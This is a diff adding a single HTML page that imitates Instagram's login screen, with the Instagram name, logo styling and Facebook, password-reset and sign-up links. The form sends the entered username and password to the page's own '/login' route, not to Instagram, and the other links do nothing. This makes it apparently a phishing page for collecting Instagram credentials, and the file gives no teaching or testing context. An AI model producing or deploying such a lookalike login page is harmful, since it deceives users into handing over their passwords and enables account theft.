@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-50 flex flex-col items-center justify-center h-screen">
+    <div class="bg-white border border-gray-300 p-8 w-80 flex flex-col items-center">
+        <h1 class="text-4xl font-serif mb-8 italic font-bold">Instagram</h1>
+        
+        <form action="/login" method="POST" class="w-full">
+            <input type="text" name="instaId" placeholder="Phone number, username, or email" 
+                class="w-full bg-gray-50 border border-gray-300 rounded-sm p-2 text-xs mb-2 focus:outline-none focus:border-gray-400" required>
+            
+            <input type="password" name="password" placeholder="Password" 
+                class="w-full bg-gray-50 border border-gray-300 rounded-sm p-2 text-xs mb-4 focus:outline-none focus:border-gray-400" required>
+            
+            <button type="submit" class="w-full bg-blue-500 text-white py-1 rounded font-semibold text-sm hover:bg-blue-600">
+                Log In
+            </button>
+        </form>
+
+        <div class="flex items-center my-4 w-full text-gray-400">
+            <hr class="flex-grow border-gray-300">
+            <span class="px-2 text-xs font-semibold">OR</span>
+            <hr class="flex-grow border-gray-300">
+        </div>
+
+        <p class="text-blue-900 text-xs font-semibold cursor-pointer">Log in with Facebook</p>
+        <p class="text-xs text-blue-900 mt-4 cursor-pointer">Forgot password?</p>
+    </div>
+
+    <div class="bg-white border border-gray-300 p-4 w-80 mt-3 text-center">
+        <p class="text-sm">Don't have an account? <span class="text-blue-500 font-semibold cursor-pointer">Sign up</span></p>
+    </div>
+</body>
+</html>
